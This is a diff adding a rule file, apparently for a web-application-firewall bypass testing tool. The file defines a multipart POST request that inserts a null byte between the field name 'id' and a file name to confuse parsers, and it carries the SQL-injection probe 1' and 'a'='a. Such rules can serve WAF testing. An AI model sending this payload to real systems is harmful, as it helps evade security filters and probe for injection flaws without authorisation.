@@ -1,0 +1,21 @@
+# @name: do9gy的宝藏规则multi-file-test-0x00
+# @tags: post,multipart,form-data,file,null-byte,id,bypass
+# @color: yellow
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: multipart_filename_null_byte
+# @intent.param: id
+# @intent.payload: 1' and 'a'='a
+# @intent.filename: 1.txt
+# @intent.null_byte_before: filename
+# @note: 参考 do9gy的宝藏规则multi-file-test，在 body 的 name="id" 与 filename="1.txt" 之间加入 0x00 截断字符。规则文件内使用 \x00 表示，发送前会还原成真实字节。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=----WAFKillerBoundary7MA4YWxkTrZu0gW
+
+------WAFKillerBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="id"\x00; filename="1.txt"
+
+1' and 'a'='a
+------WAFKillerBoundary7MA4YWxkTrZu0gW--
